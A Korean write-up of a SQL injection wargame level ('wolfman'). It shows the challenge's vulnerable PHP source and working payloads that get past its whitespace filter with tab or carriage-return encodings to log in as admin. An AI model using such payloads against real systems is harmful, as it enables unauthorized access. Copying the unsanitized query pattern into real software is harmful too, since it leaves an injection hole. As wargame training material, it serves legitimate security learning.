Lord of SQL Injection No.5 - wolfman
=============
```

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
  if($result['id'] == 'admin') solve("wolfman");
  highlight_file(__FILE__);
?>
```
위 문제에서 알 수 있는 것
-------------
preg_match로 인해 . ()가 $_GET[pw]에 들어 있으면 No Hack ~_~이 뜨면서 문제풀이에 실패하게 된다.
preg_match로 인해 공백이 $_GET[pw]에 들어 있으면 No whitespace ~_~가 뜨면서 문제풀이에 실패하게 된다.
id값에는 guest라는 값이 고정되어 있으므로 pw에 값을 넣어 조작해야한다.
DB에 저장된 id가 admin이면 문제가 풀리게 된다.

문제 풀이 법
-------------
1. 공백 우회
스페이스바 %20 대신 Tab(%09),Carrage Return(%0d),주석처리(/**/),Line Feed(%0A)등을 이용한다.
los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=123'or%09id='admin'--%09-
los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=123'or%0did='admin'--%0d-
*주의 주석처리와 LineFeed는 sql 주석처리 --%20에서는 잘 먹히지 않으니 #을 이용하여 주석처리를 해야한다.
